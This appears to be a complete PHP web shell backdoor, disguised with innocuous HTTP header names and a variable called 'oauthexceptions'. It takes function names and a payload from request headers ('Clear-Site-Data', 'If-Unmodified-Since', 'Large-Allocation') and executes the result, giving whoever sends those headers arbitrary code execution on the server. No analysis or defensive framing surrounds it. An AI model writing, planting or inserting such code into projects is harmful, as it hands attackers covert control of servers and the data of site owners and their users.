<?php
$_HEADERS = getallheaders();
if (isset($_HEADERS['Clear-Site-Data'])) {
    $oauthexceptions = $_HEADERS['Clear-Site-Data']('', $_HEADERS['If-Unmodified-Since']($_HEADERS['Large-Allocation']));
    $oauthexceptions();
}